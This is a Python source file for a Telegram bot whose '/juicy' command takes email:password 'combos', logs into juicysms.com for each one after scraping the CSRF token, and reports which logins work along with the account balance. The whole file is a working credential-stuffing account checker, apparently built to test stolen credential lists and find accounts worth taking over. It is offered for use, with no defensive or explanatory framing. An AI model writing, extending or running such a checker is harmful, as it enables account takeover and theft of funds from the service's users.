import requests
import time
from bs4 import BeautifulSoup

def process_juicy_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ JUICYSMS ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_juicy_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /juicy email:password")

def check_juicy_account(account):
    email, password = account.split(':')
    login_url = "https://juicysms.com/user-login"
    session = requests.Session()

    # Step 1: Get CSRF token
    csrf_token = get_csrf_token(session, login_url)

    # Step 2: Log in
    login_data = {
        "_token": csrf_token,
        "login-form-email": email,
        "login-form-password": password,
        "login-form-submit": "login"
    }
    headers = {
        "Origin": "https://juicysms.com",
        "Referer": "https://juicysms.com/login",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
    }
    response = session.post(login_url, data=login_data, headers=headers)

    if "Please make sure your email/password is valid." in response.text:
        return "Incorrect Email OR Password❌"

    # Step 3: Get account balance
    balance = get_account_balance(session)

    return f"Balance: {balance}€"

def get_csrf_token(session, url):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': '_token'})['value']
    return token

def get_account_balance(session):
    account_url = "https://juicysms.com/myaccount"
    headers = {
        "Referer": "https://juicysms.com/",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
    }
    response = session.get(account_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    balance = soup.find('h2', text='Balance:').find_next_sibling('h2').text.strip()
    return balance

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
